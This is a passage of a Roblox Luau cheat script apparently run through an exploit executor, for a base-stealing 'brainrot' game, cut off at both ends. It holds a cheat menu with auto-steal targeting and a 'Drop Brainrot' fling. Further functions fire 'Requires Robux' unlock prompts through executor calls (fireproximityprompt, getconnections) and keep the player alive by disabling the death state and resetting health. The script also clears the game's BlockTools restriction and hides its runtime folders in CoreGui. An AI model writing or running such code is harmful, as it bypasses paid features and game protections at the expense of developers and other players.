				frame6.Size = UDim2.new(1, -20, 0, (n17 + 4) * (n14 + 1))
				frame6.Parent = frame4
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Vertical
				uiListLayout.Padding = UDim.new(0, 4)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = frame6
				v16 = frame6
				v18 = frame6
				local textLabel7 = Instance.new("TextLabel")
				textLabel7.BackgroundTransparency = 1
				textLabel7.LayoutOrder = 99
				textLabel7.Size = UDim2.new(1, 0, 0, 22)
				textLabel7.Text = ""
				textLabel7.TextColor3 = Color3.fromRGB(140, 140, 150)
				textLabel7.TextScaled = true
				textLabel7.Visible = false
				fn30(textLabel7)
				textLabel7.Parent = frame6
				v20 = textLabel7
				table.clear(tbl4)

				for i_ = 1, n14 + 1 do
					tbl4[i_] = fn38(i_)
				end
			end

			local function fn40(arg, arg2, arg3, arg4, arg5)
				local modelKey = tostring(arg5) .. "|" .. arg4
				if arg.ModelKey == modelKey and arg.Clone and arg.Clone.Parent then
					return
				end

				for _, child in ipairs(arg.Viewport:GetChildren()) do
					if not child:IsA("Camera") then
						child:Destroy()
					end
				end

				arg.Clone = nil
				arg.Track = nil
				arg.SourceTrack = nil
				if arg4 == "" then
					arg.ModelKey = modelKey
					return
				end
				local v26 = fn35(arg2, arg3, arg4)
				if not v26 then
					arg.ModelKey = nil
					return
				end
				arg.ModelKey = modelKey

				local ok, clone = pcall(function()
					return v26:Clone()
				end)

				if not ok or not clone then
					arg.ModelKey = nil
					return
				end

				for _, descendant in ipairs(clone:GetDescendants()) do
					if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
						descendant:Destroy()
					end
				end

				local worldModel = Instance.new("WorldModel")
				worldModel.Parent = arg.Viewport
				clone.Parent = worldModel

				pcall(function()
					clone:PivotTo(CFrame.new())
				end)

				local ok2, result, result2 = pcall(function()
					return clone:GetBoundingBox()
				end)

				local v27 = ok2 and result2
				local n24 = 4

				if v27 then
					n24 = math.max(result2.X, result2.Y, result2.Z)
				end

				local n25 = math.max(n24 * 1.05, 3)
				ok2 = ok2 and result.Position or Vector3.zero
				arg.Camera.CFrame = CFrame.lookAt(ok2 + Vector3.new(n25 * 0.28, n25 * 0.08, -n25), ok2, Vector3.new(0, 1, 0))
				arg.Clone = clone
				local humanoid = v26:FindFirstChildWhichIsA("Humanoid") or v26:FindFirstChildWhichIsA("AnimationController")
				humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
				local humanoid2 = clone:FindFirstChildWhichIsA("Humanoid") or clone:FindFirstChildWhichIsA("AnimationController")
				humanoid2 = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")
				if not (humanoid and humanoid2) then
					return
				end
				local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
				playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]
				if not playingAnimationTracks or not playingAnimationTracks.Animation then
					return
				end
				local animation = Instance.new("Animation")
				animation.AnimationId = playingAnimationTracks.Animation.AnimationId

				local ok3, track = pcall(function()
					return humanoid2:LoadAnimation(animation)
				end)

				if ok3 and track then
					pcall(function()
						track.Looped = true
						track:Play(0)
						track.TimePosition = playingAnimationTracks.TimePosition
						track:AdjustSpeed(playingAnimationTracks.Speed)
					end)

					arg.Track = track
					arg.SourceTrack = playingAnimationTracks
				end
			end

			local function fn41()
				for _, v26 in ipairs(tbl4) do
					local track = v26.Track
					local sourceTrack = v26.SourceTrack

					if track and sourceTrack and v26.Row.Visible then
						if not pcall(function()
							if not track.IsPlaying then
								track:Play(0)
							end

							if math.abs(track.TimePosition - sourceTrack.TimePosition) > 0.2 then
								track.TimePosition = sourceTrack.TimePosition
							end
						end) then
							v26.Track = nil
							v26.SourceTrack = nil
						end
					end
				end
			end

			local function fn42(arg, arg2)
				for _, child in ipairs(arg.TraitHolder:GetChildren()) do
					if child:IsA("ImageLabel") then
						child:Destroy()
					end
				end

				arg2 = arg2 and arg2:FindFirstChild("Traits")
				if not arg2 then
					return
				end
				local layoutOrder = 0

				for _, child in ipairs(arg2:GetChildren()) do
					if child:IsA("ImageLabel") and child.Visible and child.Image ~= "" and layoutOrder < 3 then
						layoutOrder += 1
						local imageLabel = Instance.new("ImageLabel")
						imageLabel.BackgroundTransparency = 1
						imageLabel.Image = child.Image
						imageLabel.LayoutOrder = layoutOrder
						imageLabel.Size = UDim2.fromOffset(12, 12)
						imageLabel.Parent = arg.TraitHolder
					end
				end
			end

			local function fn43()
				if not flag10 then
					if screenGui3 then
						fn29()
					end

					return
				end

				local now = os.clock()
				if now - n21 < n15 then
					return
				end
				n21 = now
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not character_ then
					fn29()
					return
				end
				fn39()
				fn9(false)
				local v26 = nil
				local plot = nil

				for _, v27 in ipairs(tbl3) do
					if v27.Prompt.Parent then
						local magnitude = (character_.Position - v27.Spawn.Position).Magnitude

						if magnitude <= n13 and (not v26 or magnitude < v26) then
							plot = v27.Plot
							v26 = magnitude
						end
					end
				end

				if plot then
					v23 = plot
					n22 = now
				elseif v23 and v23.Parent and now - n22 < 3 then
					plot = v23
				end

				local tbl5 = {}

				if plot then
					for _, v27 in ipairs(tbl3) do
						local prompt3 = v27.Prompt
						local parent = v27.Plot == plot and prompt3.Parent

						if parent then
							parent = tostring(prompt3.ObjectText or "") ~= ""
						end

						if parent then
							tbl5[#tbl5 + 1] = {
								Podium = v27,
								Distance = (character_.Position - v27.Spawn.Position).Magnitude,
								Generation = v27.Generation or 0,
							}
						end
					end
				end

				local v27 = nil

				for _, v28 in ipairs(tbl5) do
					if not v27 or v28.Distance < v27.Distance then
						v27 = v28
					end
				end

				table.sort(tbl5, function(arg, arg2)
					return arg.Generation > arg2.Generation
				end)

				local tbl6 = {}

				if v27 then
					tbl6[#tbl6 + 1] = { Data = v27, Rank = 0 }
				end

				for i_ = 1, math.min(n19, #tbl5) do
					tbl6[#tbl6 + 1] = { Data = tbl5[i_], Rank = i_ }
				end

				local str5 = tostring(prompt2)

				for _, v28 in ipairs(tbl6) do
					str5 ..= "|" .. tostring(v28.Data.Podium.Prompt) .. ":" .. tostring(v28.Rank)
				end

				local flag11 = str5 ~= str3
				str3 = str5

				if v17 then
					v17.Text = plot and string.format("%d brainrot here", #tbl5) or "walk into a base"
				end

				n23 = #tbl6
				v25 = plot
				fn33()
				if flag9 then
					return
				end

				for i_, v28 in ipairs(tbl4) do
					local v29 = tbl6[i_]

					if not v29 then
						v28.Row.Visible = false
						v28.Prompt = nil
						v28.RowKey = nil
						v28.Clone = nil
						v28.Track = nil
						v28.SourceTrack = nil
					else
						local podium = v29.Data.Podium
						local text = tostring(podium.Prompt.ObjectText or "")
						v28.Row.Visible = true
						v28.Prompt = podium.Prompt
						v28.RowKey = tostring(podium.Prompt) .. ":" .. tostring(v29.Rank)

						if v29.Rank == 0 then
							v28.Rank.Text = "NEAR"
							v28.Rank.TextColor3 = Color3.fromRGB(125, 205, 255)
						else
							v28.Rank.Text = "#" .. v29.Rank
							v28.Rank.TextColor3 = Color3.fromRGB(255, 214, 84)
						end

						v28.NameLabel.Text = text
						chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(v28.NameStyle, v29.Data.Generation)
						v28.ValueLabel.Text = fn8(v29.Data.Generation)

						if flag11 then
							local v30 = fn34(podium.Spawn, text)
							local mutation = v30 and v30:FindFirstChild("Mutation")

							if mutation and mutation:IsA("TextLabel") and mutation.Visible and tostring(mutation.Text) ~= "" then
								v28.MutationLabel.Text = mutation.Text
								v28.MutationLabel.TextColor3 = mutation.TextColor3
								v28.MutationLabel.RichText = mutation.RichText
							else
								v28.MutationLabel.Text = ""
							end

							fn42(v28, v30)
						end

						fn40(v28, podium.Plot, podium.Spawn, text, podium.Prompt)
					end
				end

				fn37()
			end

			fn4(RunService.Heartbeat:Connect(function()
				if flag2 then
					fn43()
				end
			end))

			local n24 = 0

			fn4(RunService.Heartbeat:Connect(function()
				if not (flag2 and flag10 and screenGui3) then
					return
				end
				local now = os.clock()
				if now < n24 then
					return
				end
				n24 = now + 0.25
				fn41()
			end))

			v12:CreateToggle({
				Name = "Show Auto Steal Bar",
				Note = "Shows the current Auto Steal target and hold progress.",
				Default = true,
				Quick = false,
				SubOf = v14,
				Callback = function(arg)
					flag5 = arg == true
					fn26()
				end,
			})

			v12:CreateToggle({
				Name = "Show Distance Meter",
				Note = "Adds a live distance row to the bar, measured against Auto Steal Distance.",
				Default = false,
				Quick = false,
				SubOf = v14,
				Callback = function(arg)
					fn24(arg == true)
				end,
			})

			v12:CreateSlider({
				Name = "Base Panel Size",
				Note = "Scales the Base Target Panel.",
				Min = 60,
				Max = 160,
				Default = 85,
				AllowDecimals = false,
				Increment = 1,
				Unit = "%",
				Quick = false,
				Callback = function(arg)
					n20 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)

					if v19 then
						v19()
					end
				end,
			})

			local v26 = v12:CreateToggle({
				Name = "Base Target Panel",
				Note = "Lists the nearest and highest Brainrots in this base; pick one to take it first.",
				Default = true,
				Quick = false,
				Callback = function(arg)
					flag10 = arg == true

					if not flag10 then
						fn29()
					end
				end,
			})

			v12:CreateDropdown({
				Name = "Base Target Count",
				Options = { "1", "2", "3", "4", "5" },
				Default = "3",
				Quick = false,
				SubOf = v26,
				Callback = function(arg)
					local n25 = math.clamp(math.floor(tonumber(arg) or 5), 1, 5)
					if n19 == n25 then
						return
					end
					n19 = n25
					str3 = ""
					n21 = -math.huge

					if flag10 then
						fn43()
					end
				end,
			})

			v12:CreateButton({
				Name = "Pick Nearest Target",
				ButtonText = "Pick",
				Note = "Targets the closest Brainrot; bind a key to it for one-press picking.",
				Quick = false,
				SubOf = v26,
				Callback = function()
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
					if not character_ then
						return
					end
					fn9(false)
					local v27 = nil
					local v28 = nil

					for _, v29 in ipairs(tbl3) do
						local prompt3 = v29.Prompt
						local parent = prompt3.Parent

						if parent then
							parent = tostring(prompt3.ObjectText or "") ~= ""
						end

						if parent then
							local magnitude = (character_.Position - v29.Spawn.Position).Magnitude

							if not v27 or magnitude < v27 then
								v27 = magnitude
								v28 = v29
							end
						end
					end

					if not v28 then
						return
					end
					prompt2 = v28.Prompt
					str4 = tostring(v28.Prompt.ObjectText or "")
					fn27()
					str3 = ""
					fn37()
				end,
			})

			v12:CreateButton({
				Name = "Clear Picked Target",
				ButtonText = "Clear",
				Note = "Drops the picked Brainrot and returns to Nearest or Highest.",
				Quick = false,
				SubOf = v26,
				Callback = function()
					prompt2 = nil
					str4 = ""
					str3 = ""
					fn37()
				end,
			})
		end

		do
			local n22 = 0.05
			local n23 = 22
			local n24 = 9
			local v20 = nil
			local n25 = -math.huge
			local n26 = 0
			local flag11 = false
			local v21 = nil

			fn4(RunService.RenderStepped:Connect(function(deltaTime)
				if flag2 and flag3 then
					fn23(deltaTime)
				elseif v13 then
					fn22()
				end

				if not flag2 or not flag3 or not flag5 then
					v20 = nil
					return
				end
				local now = os.clock()

				if now - n25 >= n22 then
					n25 = now
					local str4, str5, generation

					if flag7 or localPlayer:GetAttribute("Stealing") == true then
						n26 = 0
						str4 = "GET READY - carrying brainrot"
						str5 = ""
						generation = nil
					else
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

						if character_ then
							local v22, v23

							if flag4 then
								local v24, v25, v26
								v24, v25, v22, v26, v23 = fn18(character_)
							else
								local v24, v25, v26, v27
								v24, v25, v26, v27, v23 = fn18(character_)
								v22 = fn11(character_) or v25 or v27
							end

							if v22 then
								str4 = v22.Name
								str5 = fn8(v22.Generation)
								generation = v22.Generation
								local n27 = math.max(tonumber(n3) or 20, 1)
								n26 = 1 - math.clamp(v22.Distance / n27, 0, 1)

								if visible then
									str4 = string.format("%s   %.0f/%d", v22.Name, v22.Distance, n27)
								end

								local n28 = 10

								pcall(function()
									n28 = v22.Prompt.MaxActivationDistance
								end)

								flag11 = v22.Distance <= n28
							else
								str4 = v23 == 0 and "no steal prompts" or ""
								n26 = 0
								flag11 = false
								str5 = ""
								generation = nil
							end
						else
							n26 = 0
							flag11 = false
							str4 = ""
							str5 = ""
							generation = nil
						end
					end

					local str6 = tostring(str4) .. "\0" .. tostring(str5)

					if str6 ~= v20 then
						v20 = str6
						fn25(str4, str5, generation)
					end
				end

				if flag8 and localPlayer:GetAttribute("Stealing") == true then
					flag8 = false
				end

				local n27 = 0

				if flag8 then
					n27 = math.clamp((now - n8) / n9, 0, 1)
				end

				local n28 = math.min(deltaTime or 0.016, 0.1)
				n10 += (n27 - n10) * (1 - math.exp(-n28 * n23))

				if n27 <= 0 and n10 < 0.002 then
					n10 = 0
				end

				frame2.Size = UDim2.new(n10, 0, 1, 0)

				if visible then
					n11 += (n26 - n11) * (1 - math.exp(-n28 * n24))
					frame3.Size = UDim2.new(n11, 0, 1, 0)

					if flag11 ~= v21 then
						v21 = flag11
						frame3.BackgroundTransparency = flag11 and 0.35 or 0.62
					end
				end
			end))
		end

		local function fn30()
			if not flag2 then
				return
			end
			flag2 = false
			flag3 = false
			flag7 = false
			n5 += 1
			fn20()
			fn6()
			fn22()
			fn29()
			fn28()

			if screenGui2 then
				pcall(function()
					screenGui2:Destroy()
				end)
			end

			if screenGui then
				pcall(function()
					screenGui:Destroy()
				end)
			end
		end

		bindableEvent.Event:Connect(fn30)
		folder.Destroying:Connect(fn30)

		do
			local flag11 = true
			local flag12 = false
			local n22 = 0
			local connection2 = nil
			local chilliDropBrainrotRuntime = CoreGui:FindFirstChild("__ChilliDropBrainrotRuntime")

			if chilliDropBrainrotRuntime then
				local cleanup = chilliDropBrainrotRuntime:FindFirstChild("Cleanup")

				if cleanup and cleanup:IsA("BindableEvent") then
					pcall(function()
						cleanup:Fire()
					end)
				end

				pcall(function()
					chilliDropBrainrotRuntime:Destroy()
				end)
			end

			local folder2 = Instance.new("Folder")
			folder2.Name = "__ChilliDropBrainrotRuntime"
			folder2.Archivable = false
			folder2.Parent = CoreGui
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder2

			local function fn31(arg)
				localPlayer:SetAttribute("ChilliDropBrainrotActive", arg == true)
			end

			local function fn32(arg, arg2)
				return flag11 and arg == n22 and localPlayer.Character == arg2
			end

			local function fn33()
				if flag12 or localPlayer:GetAttribute("Stealing") ~= true then
					return
				end
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoid or not humanoidRootPart then
					return
				end
				n22 += 1
				local v20 = n22
				flag12 = true
				fn31(true)

				task.spawn(function()
					local cFrame = humanoidRootPart.CFrame
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					local health = humanoid.Health
					local breakJointsOnDeath = humanoid.BreakJointsOnDeath
					local requiresNeck = humanoid.RequiresNeck
					local flag13 = true

					pcall(function()
						flag13 = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
						humanoid.BreakJointsOnDeath = false
						humanoid.RequiresNeck = false
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
					end)

					local connection3 = humanoid.HealthChanged:Connect(function(health2)
						if fn32(v20, character_) and health2 <= 0 then
							pcall(function()
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end)
						end
					end)

					pcall(function()
						local now = os.clock()

						while fn32(v20, character_) and humanoidRootPart.Parent and humanoid.Parent and os.clock() - now < 0.35 do
							if humanoid.Health <= 0 then
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end

							humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
							humanoidRootPart.CFrame = cFrame
							task.wait()
						end

						if fn32(v20, character_) and humanoidRootPart.Parent then
							humanoidRootPart.CFrame = cFrame
							humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
						end

						local now2 = os.clock()

						while fn32(v20, character_) and humanoid.Parent and localPlayer:GetAttribute("Stealing") == true and os.clock() - now2 < 1.5 do
							if humanoid.Health <= 0 then
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end

							task.wait()
						end
					end)

					if connection3 then
						connection3:Disconnect()
					end

					if localPlayer.Character == character_ and humanoid.Parent then
						pcall(function()
							humanoid.BreakJointsOnDeath = breakJointsOnDeath
							humanoid.RequiresNeck = requiresNeck
							humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, flag13)

							if health > 0 and humanoid.Health <= 0 then
								humanoid.Health = health
							end
						end)
					end

					if v20 == n22 then
						flag12 = false

						if flag11 then
							fn31(false)
						end
					end
				end)
			end

			local function fn34()
				if not flag11 then
					return
				end
				flag11 = false
				n22 += 1
				flag12 = false
				fn31(false)

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			fn31(false)

			connection2 = localPlayer.CharacterAdded:Connect(function()
				n22 += 1
				flag12 = false
				fn31(false)
			end)

			bindableEvent2.Event:Connect(fn34)
			folder2.Destroying:Connect(fn34)
			v12:CreateButton({ Name = "Drop Brainrot", ButtonText = "Drop", Callback = fn33 })
		end

		v10 = Helper:CreateSection({ Name = "Helper", Expanded = true })
		v11 = Helper:CreateSection({ Name = "Aimbot", Expanded = true })
		v5 = Helper:CreateSection({ Name = "Movement & Combat", Expanded = true })
		local v20
		v20 = Helper:CreateSection({ Name = "Unlock Base", Expanded = true })
		local flag11
		flag11 = false
		local folder2

		do
			local v21 = CoreGui

			pcall(function()
				if type(gethui) == "function" then
					local hui = gethui()

					if typeof(hui) == "Instance" then
						v21 = hui
					end
				end
			end)

			local chilliUnlockBaseRuntime = v21:FindFirstChild("__ChilliUnlockBaseRuntime")

			if chilliUnlockBaseRuntime then
				local cleanup = chilliUnlockBaseRuntime:FindFirstChild("Cleanup")

				if cleanup and cleanup:IsA("BindableEvent") then
					pcall(function()
						cleanup:Fire()
					end)
				end

				pcall(function()
					chilliUnlockBaseRuntime:Destroy()
				end)
			end

			folder2 = Instance.new("Folder")
			folder2.Name = "__ChilliUnlockBaseRuntime"
			folder2.Archivable = false
			folder2.Parent = v21
		end

		do
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder2

			local function fn31()
				local character_ = localPlayer.Character
				if not character_ then
					return nil
				end
				return character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso")
			end

			local function fn32()
				return Workspace:FindFirstChild("Plots")
			end

			local function fn33(arg, arg2)
				local n22 = arg.X - arg2.X
				local n23 = arg.Z - arg2.Z
				return math.sqrt(n22 * n22 + n23 * n23)
			end

			local function fn34(arg, arg2)
				local animalPodiums = arg:FindFirstChild("AnimalPodiums")
				local huge = math.huge

				if animalPodiums then
					for _, child in ipairs(animalPodiums:GetChildren()) do
						local base = child:FindFirstChild("Base")
						base = base and base:FindFirstChild("Spawn")

						if base and base:IsA("BasePart") then
							huge = math.min(huge, fn33(arg2, base.Position))
						end
					end
				end

				if huge == math.huge then
					local ok, result = pcall(function()
						return arg:GetPivot()
					end)

					if ok then
						huge = fn33(arg2, result.Position)
					end
				end

				return huge
			end

			local function fn35()
				local v21 = fn31()
				local v22 = fn32()
				if not v21 or not v22 then
					return nil
				end
				local huge = math.huge
				local v23 = nil

				for _, child in ipairs(v22:GetChildren()) do
					local v24 = fn34(child, v21.Position)

					if v24 < huge then
						huge = v24
						v23 = child
					end
				end

				return v23
			end

			local function fn36(arg)
				local v21 = fn32()

				while arg and arg ~= Workspace do
					if arg.Parent == v21 then
						return arg
					end
					arg = arg.Parent
				end

				return nil
			end

			local function fn37(arg)
				arg = arg and arg:FindFirstChild("AnimalPodiums")
				local tbl5 = {}
				if not arg then
					return tbl5
				end

				for _, child in ipairs(arg:GetChildren()) do
					local base = child:FindFirstChild("Base")
					base = base and base:FindFirstChild("Spawn")

					if base and base:IsA("BasePart") then
						local y = base.Position.Y
						local flag12 = false

						for _, v21 in ipairs(tbl5) do
							if math.abs(v21 - y) < 1 then
								flag12 = true
								break
							end
						end

						if not flag12 then
							tbl5[#tbl5 + 1] = y
						end
					end
				end

				table.sort(tbl5)
				return tbl5
			end

			local function fn38(arg, arg2)
				local animalPodiums = arg2 and arg2:FindFirstChild("AnimalPodiums")

				while arg and arg ~= arg2 do
					if arg.Parent == animalPodiums then
						local base = arg:FindFirstChild("Base")
						base = base and base:FindFirstChild("Spawn")
						if base and base:IsA("BasePart") then
							return base.Position.Y
						end
						return nil
					end

					arg = arg.Parent
				end

				return nil
			end

			local function fn39(arg, arg2)
				local v21 = fn37(arg2)
				local v22 = fn38(arg, arg2)

				if v22 and #v21 > 0 then
					local huge = math.huge
					local n22 = 1

					for i_, v23 in ipairs(v21) do
						local n23 = math.abs(v22 - v23)

						if n23 < huge then
							huge = n23
							n22 = i_
						end
					end

					return math.clamp(n22, 1, 3)
				end

				local v23 = fn31()
				if not v23 or #v21 == 0 then
					return 1
				end
				local y = v21[1]

				local ok, result = pcall(function()
					return arg2:GetPivot()
				end)

				if ok then
					y = result.Position.Y
				end

				local n22 = v21[1] - y
				local n23 = 1

				for i_ = 2, math.min(#v21, 3) do
					if v21[i_] - n22 <= v23.Position.Y then
						n23 = i_
					end
				end

				return n23
			end

			local function fn40(arg)
				arg = arg and arg:FindFirstChild("Unlock")
				local tbl5 = {}
				if not arg then
					return tbl5
				end

				for _, child in ipairs(arg:GetChildren()) do
					local position

					if child:IsA("Model") then
						local ok, result = pcall(function()
							return child:GetPivot()
						end)

						position = nil

						if ok then
							position = result.Position
						end
					else
						position = nil

						if child:IsA("BasePart") then
							position = child.Position
						end
					end

					if position then
						tbl5[#tbl5 + 1] = { Instance = child, Y = position.Y }
					end
				end

				table.sort(tbl5, function(arg2, arg3)
					return arg2.Y < arg3.Y
				end)

				return tbl5
			end

			local function fn41(arg, arg2)
				local v21 = fireproximityprompt
				if type(v21) ~= "function" then
					return false
				end
				local v22 = fn40(arg)[arg2]
				if not v22 then
					return false
				end
				local flag12 = false

				for _, descendant in ipairs(v22.Instance:GetDescendants()) do
					if descendant:IsA("ProximityPrompt") then
						flag12 = pcall(v21, descendant) or flag12
					end
				end

				return flag12
			end

			local function fn42(arg)
				local v21 = fn35()

				if v21 then
					fn41(v21, arg)
				end
			end

			local function fn43(arg)
				if not arg or not arg:IsA("ProximityPrompt") then
					return false
				end
				return string.find(string.lower(tostring(arg.ActionText or "")), "steal", 1, true) ~= nil
			end

			local connection2 = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt3, player)
				if not flag11 or player and player ~= localPlayer or not fn43(prompt3) then
					return
				end
				local v21 = fn36(prompt3) or fn35()
				if not v21 then
					return
				end
				local v22 = fn39(prompt3, v21)
				task.defer(fn41, v21, v22)
			end)

			local function fn44(arg)
				arg._quickBarDefault = 4
				return arg
			end

			fn44(v20:CreateToggle({
				Name = "Auto Unlock Base",
				Note = "Unlocks the current floor when you start stealing. Requires Robux.",
				Default = false,
				Pin = true,
				QuickBar = 4,
				Callback = function(arg)
					flag11 = arg == true
				end,
			}))

			fn44(v20:CreateButton({
				Name = "Unlock Floor 3",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 3 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					fn42(3)
				end,
			}))

			fn44(v20:CreateButton({
				Name = "Unlock Floor 2",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 2 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					fn42(2)
				end,
			}))

			fn44(v20:CreateButton({
				Name = "Unlock Floor 1",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 1 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					fn42(1)
				end,
			}))

			local function fn45()
				flag11 = false

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			bindableEvent2.Event:Connect(fn45)
			folder2.Destroying:Connect(fn45)
		end

		local chilliHelperLocalRuntime = CoreGui:FindFirstChild("__ChilliHelperLocalRuntime")

		if chilliHelperLocalRuntime then
			local cleanup = chilliHelperLocalRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliHelperLocalRuntime:Destroy()
			end)
		end

		do
			local folder3 = Instance.new("Folder")
			folder3.Name = "__ChilliHelperLocalRuntime"
			folder3.Archivable = false
			folder3.Parent = CoreGui
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder3
			flag = true
			local tbl5 = {}

			fn2 = function(arg)
				tbl5[#tbl5 + 1] = arg
			end

			local function fn31()
				if not flag then
					return
				end
				flag = false

				for _, v21 in ipairs(tbl5) do
					pcall(v21)
				end

				table.clear(tbl5)
			end

			bindableEvent2.Event:Connect(fn31)
			folder3.Destroying:Connect(fn31)
		end

		do
			local function fn31()
				if localPlayer:GetAttribute("BlockTools") == true then
					localPlayer:SetAttribute("BlockTools", false)
				end
			end

			fn31()
			local connection2 = localPlayer:GetAttributeChangedSignal("BlockTools"):Connect(fn31)

			fn2(function()
				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end)
		end
	end

	tbl2 = { ProtectedHumanoid = nil, RescueSerial = 0 }

	do
		local n = 0.5
		local v12 = nil
		local tbl3 = nil
		local tbl4 = {}
		local flag2 = false
		local n2 = 0

		local function fn4()
			for _, v13 in ipairs(tbl4) do
				if v13.Connected then
					v13:Disconnect()
				end
			end

			table.clear(tbl4)
		end

		local function fn5()
			fn4()
			local v13 = v12
			local v14 = tbl3
			v12 = nil
			tbl3 = nil
			tbl2.ProtectedHumanoid = nil
			if not v13 or not v13.Parent or not v14 then
				return
			end

			pcall(function()
				v13.BreakJointsOnDeath = v14.BreakJointsOnDeath
				v13.RequiresNeck = v14.RequiresNeck
				v13:SetStateEnabled(Enum.HumanoidStateType.Dead, v14.DeadStateEnabled)
			end)
		end

		local function fn6(arg)
			if not arg or not arg.Parent then
				return false
			end

			return pcall(function()
				arg.BreakJointsOnDeath = false
				arg.RequiresNeck = false
				arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
		end

		local function fn7(arg)
			if arg ~= v12 or not arg or not arg.Parent or flag2 then
				return false
			end
			local maxHealth = arg.MaxHealth
			if maxHealth <= 0 then
				return false
			end

			if maxHealth == math.huge or arg.Health >= maxHealth then
				return true
			end
			local flag3 = arg.Health <= 0
			flag2 = true

			local ok = pcall(function()
				arg.Health = maxHealth
			end)

			flag2 = false

			if ok and flag3 and arg.Health > 0 then
				tbl2.RescueSerial = tbl2.RescueSerial + 1
			end

			return ok and arg.Health >= maxHealth
		end

		local function fn8(arg)
			fn5()
			if not flag or not arg or arg ~= localPlayer.Character then
				return false
			end
			local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return false
			end
			v12 = humanoid
			tbl2.ProtectedHumanoid = humanoid

			tbl3 = {
				BreakJointsOnDeath = humanoid.BreakJointsOnDeath,
				RequiresNeck = humanoid.RequiresNeck,
				DeadStateEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead),
			}

			if not fn6(humanoid) or not fn7(humanoid) then
				fn5()
				return false
			end

			tbl4[#tbl4 + 1] = humanoid.HealthChanged:Connect(function()
				fn7(humanoid)
			end)

			tbl4[#tbl4 + 1] = humanoid:GetPropertyChangedSignal("MaxHealth"):Connect(function()
				fn7(humanoid)
			end)

			tbl4[#tbl4 + 1] = humanoid.StateChanged:Connect(function(old, new)
				if new == Enum.HumanoidStateType.Dead then
					fn6(humanoid)
					fn7(humanoid)
				end
			end)

			n2 = os.clock()
			return true
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character_)
			fn8(character_)
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local now = os.clock()

			if v12 and now - n2 >= n then
				n2 = now
				fn6(v12)
				fn7(v12)
			end
		end)

		task.spawn(function()
			fn8(localPlayer.Character)
		end)

		fn2(function()
			fn5()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end)
	end

	local fn4, fn5
	local n = 2

	fn4 = function(arg)
		local character_ = localPlayer.Character
		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		return character_ and character_:FindFirstChild(arg) or backpack and backpack:FindFirstChild(arg)
	end

	fn5 = function(arg)
		local v12 = fn4(arg)
		if v12 then
			return v12
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("Content")
		playerGui = playerGui and playerGui:FindFirstChild("Items")
		playerGui = playerGui and playerGui:FindFirstChild(arg)
		local locked = playerGui and playerGui:FindFirstChild("Locked")
		playerGui = playerGui and playerGui:FindFirstChild("Buy")
		if locked and locked.Visible then
			return nil, "rebirth"
		end

		if not playerGui then
			return nil, "unavailable"
		end
		local ok, result = pcall(getconnections, playerGui.Activated)
		if not ok or type(result) ~= "table" then
			return nil, "unavailable"
		end
		local flag2 = false

